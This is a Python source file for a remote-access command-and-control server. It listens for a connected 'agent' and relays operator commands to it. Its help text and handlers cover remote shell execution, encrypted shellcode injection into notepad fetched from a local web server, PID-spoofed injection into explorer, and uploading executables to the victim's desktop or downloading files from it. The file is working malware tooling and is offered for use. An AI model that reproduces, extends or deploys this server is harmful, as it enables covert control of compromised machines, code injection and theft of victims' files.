import socket
import select
import time
import base64
import os

def Session(host, port):

    h = ">> shell whoami\n>> inject http://192.168.1.2:8888/shellcode.enc notepad DtGvFck#\n>> pid_inject explorer c:\\windows\system32\ikiik.exe http://192.168.1.2:8888/shellcode.enc DtGvFck#\n>> download c:\\users\issam\desktop\ikiik.exe\n>> upload http://192.168.1.2:8888/ikiik.exe c:\\users\issam\desktop\ikiik.exe"
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        print("[+] server started ")
        s.listen(0)
        true = True
        while true:  
            print("[+] listening ....")
            conn, addr = s.accept()
            print("[+] agent connected ", addr)
            try:
                while True:
                    commandinput = input("command > ")
                    if '"' in commandinput:
                        start = commandinput.index('"')
                        end = commandinput.rindex('"')
                        temp = commandinput[start:end+1]
                        temp = temp.replace(" ", "*")
                        commandinput = commandinput[:start] + temp[1:-1] + commandinput[end+1:]
                    command = commandinput.split(' ')
                    if len(command) == 1 and command[0] == "exit":
                        CloseSession(conn, commandinput)
                        break
                    else:
                        pass
                    # help
                    if len(command) == 1 and command[0] == "help":
                        print(h)
                    # DownloadFile
                    if len(command) > 1 and len(command) < 3 and command[0] == "download":         
                        try:
                            SendCommand(conn, commandinput)
                        except:
                            print("[!] the agent is disconnected. ")
                            break
                        content = RecvOutput(conn)
                        DownloadFile(content)
                    # UplaodFile
                    if len(command) > 1 and len(command) < 4 and command[0] == "upload":
                        if UploadFile((command[1].split("/"))[-1]) == True:
                            try:
                                SendCommand(conn, commandinput)
                            except:
                                print("[!] the agent is disconnected. ")
                                break
                            result = RecvOutput(conn)
                            print(result)
                        else:
                            pass
                    # ShellCommand
                    if len(command) > 0 and command[0] == "shell":
                        try:
                            SendCommand(conn, commandinput)
                        except:
                            print("[!] the agent is disconnected")
                            break
                        result = RecvOutput(conn)
                        print(result)
                    # Process Injection
                    if len(command) > 1 and len(command) < 5 and command[0] == "inject":
                        try:
                            SendCommand(conn, commandinput)
                        except:
                            print("[!] the agent is disconnected")
                            break
                        result = RecvOutput(conn)
                        print(result)
                    # Spoof PID and spawn a process then inject
                    if len(command) > 1 and len(command) < 6 and command[0] == "pid_inject":
                        try:
                            SendCommand(conn, commandinput)
                        except:
                            print("[!] the agent is disconnected")
                            break
                        result = RecvOutput(conn)
                        print(result)
                        

            except:
                CloseSession(conn, "exit")
            #Disconnected
            true = Disconnected()

    print("[+]bye!")
    exit(1)

    

def Disconnected():
    disconnected = input("[+] agent disconnected: (keep) Or (exit): ")
    #while len(disconnected) == 0:
        #disconnected = input("[+] (keep) Or (exit): ")
    while disconnected != "keep" or disconnected != "exit":
        if disconnected == "keep":
            return True
        elif disconnected == "exit":
            return False
        else:
            disconnected = input("[+] (keep) or (exit): ")
    
    


def SendCommand(conn, command):
    conn.sendall(command.encode("utf-8"))






def RecvOutput(conn):
    output = ""
    while True: 
        try:
            data = conn.recv(1024)
            if "dtgvfck" in data.decode("utf-8"):
                break
            elif "stopandprint" in data.decode("utf-8"):
                print(output)
                output = ""
            else:
                output += data.decode("utf-8")
                
        except:
            output = "[!] something went wrong while receiving the output"
            break
    return output






def CloseSession(conn, command):
    try:
        conn.sendall(command.encode("utf-8"))
    #try:
        #print("[++] sending the exit command again to make sure the agent is still connected ")
        #conn.sendall(command.encode("utf-8"))
    except:
        print("[!] the agent didn't receive the exit command. exiting anyway. ")
    print("[+] you have exited the session with the agent")
    





def DownloadFile(content):
    if "file does not exist" in content:
        print("[!] the file does not exist")
    
    else:
        filepath = input("[++] Where do you want to store the file: ")
        if 'exe' in filepath[filepath.index('.'):]:  
            with open(filepath, "wb") as outfile:
                outfile.write(base64.b64decode(content))
                outfile.close()
        else:
            with open(filepath, "w") as outfile:
                outfile.write((base64.b64decode(content)).decode("utf-8"))
                outfile.close()


def UploadFile(filepath):
    if os.path.isfile(filepath) and os.path.exists(filepath):
        print("[+] make sure the web server is started")
        print("[+] uploading {0}".format(filepath))
        return True
    else:
        print("[!] the file {0} does not exists".format(filepath))
        return False






def main():

        bind_host = input("[+] enter ip address: ")
        bind_port = int(input("[+] enter the port: "))
        keep_listening = "k"
        Session(bind_host, bind_port)
        
                

main()
